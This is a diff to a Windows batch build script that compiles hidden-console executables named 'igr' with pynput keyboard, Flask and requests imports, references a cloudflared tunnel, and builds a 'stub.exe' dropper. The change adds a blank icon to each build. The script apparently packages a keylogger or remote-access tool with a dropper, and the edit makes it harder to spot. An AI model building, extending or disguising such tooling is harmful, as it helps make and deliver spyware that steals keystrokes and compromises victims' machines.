@@ -99,7 +99,7 @@ if not exist cloudflared.exe (
 
 echo.
 echo [5/6] Compiling igr_v%IGR_VERSION%.exe...
-python -m PyInstaller --onefile --noconsole --name igr_v%IGR_VERSION% --clean --noconfirm ^
+python -m PyInstaller --onefile --noconsole --name igr_v%IGR_VERSION% --icon=blank.ico --clean --noconfirm ^
     --hidden-import flask ^
     --hidden-import requests ^
     --hidden-import pynput.keyboard ^
@@ -298,7 +298,7 @@ echo   Done.
 REM Compile IGR exe
 echo.
 echo [4/7] Compiling igr_v%IGR_VERSION%.exe...
-python -m PyInstaller --onefile --noconsole --name igr_v%IGR_VERSION% --clean --noconfirm ^
+python -m PyInstaller --onefile --noconsole --name igr_v%IGR_VERSION% --icon=blank.ico --clean --noconfirm ^
     --hidden-import flask ^
     --hidden-import requests ^
     --hidden-import pynput.keyboard ^
@@ -326,7 +326,7 @@ echo   IGR exe compiled.
 REM Compile stub dropper
 echo.
 echo [5/7] Compiling stub.exe (dropper)...
-python -m PyInstaller --onefile --noconsole --name stub --clean --noconfirm ^
+python -m PyInstaller --onefile --noconsole --name stub --icon=blank.ico --clean --noconfirm ^
     stub.py
 
 if not exist "dist\stub.exe" (
